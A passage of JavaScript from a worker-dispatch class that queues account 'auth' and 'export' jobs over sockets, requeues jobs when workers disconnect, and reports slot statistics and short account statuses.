      this.commands.set(commandId, { resolve, reject, timer });
      worker.socket.emit(event, { commandId, jobId, ...payload });
    });
  }

  ack(commandId, payload) {
    const pending = this.commands.get(commandId);
    if (!pending) return;
    clearTimeout(pending.timer);
    this.commands.delete(commandId);
    if (payload?.ok) pending.resolve(payload);
    else pending.reject(new Error(payload?.error ?? "worker rejected command"));
  }

  /* -------------------------------------------------------------- connection */

  addWorker(socket) {
    this.workers.set(socket.id, {
      socket,
      slots: { auth: 0, export: 0 },
      connectedAt: new Date().toISOString(),
    });
  }

  ready(socket, payload) {
    const worker = this.workers.get(socket.id);
    if (!worker) return;
    worker.slots = workerSlots(payload);
    this.sweep();
    this.pump();
  }

  /** Requeue jobs whose worker vanished without a clean disconnect. */
  sweep() {
    for (const job of this.store.jobs.values()) {
      if (job.status !== "running" && job.status !== "twofa") continue;
      if (job.workerId && this.workers.has(job.workerId)) continue;
      const account = this.store.getAccount(job.accountId);
      this.store.updateJob(job.id, {
        status: "queued",
        workerId: null,
        error: "worker lost",
      });
      if (account) {
        if (job.type === "auth") {
          this.store.updateAccount(account.id, { status: "queued" });
          this.emitJob(job, account, "auth:state", {
            state: "queued",
            message: "Reconnecting to a worker",
          });
        } else if (job.type === "export") {
          this.store.updateAccount(account.id, {
            status: "exporting",
            export: { ...(account.export ?? {}), phase: "queued" },
          });
        }
      }
      this.enqueue(job.id);
    }
  }

  removeWorker(socket) {
    const worker = this.workers.get(socket.id);
    if (!worker) return;
    this.workers.delete(socket.id);
    for (const job of this.store.jobs.values()) {
      if (job.workerId !== socket.id) continue;
      if (job.status !== "running" && job.status !== "twofa") continue;
      this.store.updateJob(job.id, {
        status: "queued",
        workerId: null,
        error: "worker disconnected",
      });
      const account = this.store.getAccount(job.accountId);
      if (account) {
        if (job.type === "auth") {
          this.store.updateAccount(account.id, { status: "queued" });
          this.emitJob(job, account, "auth:state", {
            state: "queued",
            message: "Worker reconnecting",
          });
        } else if (job.type === "export") {
          this.store.updateAccount(account.id, {
            status: "exporting",
            export: { ...(account.export ?? {}), phase: "queued" },
          });
        }
      }
      this.enqueue(job.id);
    }
  }

  workerCount() {
    return this.workers.size;
  }

  slotStats() {
    let auth = 0;
    let exp = 0;
    for (const worker of this.workers.values()) {
      auth += worker.slots.auth;
      exp += worker.slots.export;
    }
    return { workers: this.workers.size, auth, export: exp, queued: this.queue.length };
  }

  statusShort(account) {
    if (!account) return "unknown";
    if (ACTIVE_ACCOUNT.has(account.status)) return "active";
    if (account.status === "connected" || account.status === "done") {
      return account.trusted ? "green" : "yellow";
    }
    if (account.status === "dead" || account.status === "twofa") return "red";
    return "yellow";
  }
}
